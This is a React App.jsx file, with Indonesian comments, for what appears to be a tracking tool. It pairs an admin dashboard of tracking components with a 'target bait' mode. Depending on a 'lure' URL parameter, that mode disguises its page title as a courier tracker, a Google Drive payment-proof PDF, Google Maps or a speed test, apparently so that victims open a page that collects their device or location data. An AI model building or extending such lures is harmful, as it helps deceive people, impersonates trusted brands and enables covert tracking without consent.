import { useState, useEffect } from "react";
import Navbar from "./components/Navbar";
import PixelTracker from "./components/PixelTracker";
import HeaderInspector from "./components/HeaderInspector";
import DeviceMap from "./components/DeviceMap";
import MobileSender from "./components/MobileSender";

export default function App() {
  // Hitung initial state langsung dari URL saat mount pertama kali
  const [activeTab, setActiveTab] = useState(() => {
    const params = new URLSearchParams(window.location.search);
    const tabParam = params.get("tab");
    const deviceParam = params.get("device");

    if (tabParam === "track" || (!tabParam && deviceParam)) {
      return "mobile-node";
    }
    return tabParam || "email-tracker";
  });

  const [isClientMode] = useState(() => {
    const params = new URLSearchParams(window.location.search);
    const tabParam = params.get("tab");
    const deviceParam = params.get("device");
    return tabParam === "track" || (!tabParam && Boolean(deviceParam));
  });

  // Atur title tab browser sesuai mode (Admin vs Umpan Target)
  useEffect(() => {
    if (!isClientMode) {
      document.title = "Security & Telemetry Sentinel";
    } else {
      const params = new URLSearchParams(window.location.search);
      const theme = params.get("theme") || params.get("lure") || "courier";
      if (theme === "courier") {
        document.title = "Lacak Pengiriman Paket & Posisi Kurir";
      } else if (theme === "gdrive") {
        document.title = "Google Drive: Bukti_Transfer_Pembayaran.pdf";
      } else if (theme === "maps") {
        document.title = "Google Maps: Titik Temu Langsung";
      } else if (theme === "speedtest") {
        document.title = "Speedtest Sinyal & Jaringan";
      } else {
        document.title = "Layanan Pelacakan Kiriman";
      }
    }
  }, [isClientMode]);

  // Mode Target / Klien (Halaman Bersih Tanpa Navbar)
  if (isClientMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-100 flex items-center justify-center p-3 md:p-6 font-sans">
        <div className="w-full max-w-md">
          <MobileSender isStandalone={true} />
        </div>
      </div>
    );
  }

  // Mode Admin Dashboard
  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 p-6 md:p-10 font-sans">
      <div className="max-w-4xl mx-auto">
        <Navbar activeTab={activeTab} setActiveTab={setActiveTab} />

        <main className="transition-all duration-200">
          {activeTab === "email-tracker" && <PixelTracker />}
          {activeTab === "header-inspector" && <HeaderInspector />}
          {activeTab === "device-map" && <DeviceMap />}
          {activeTab === "mobile-node" && <MobileSender />}
        </main>
      </div>
    </div>
  );
}
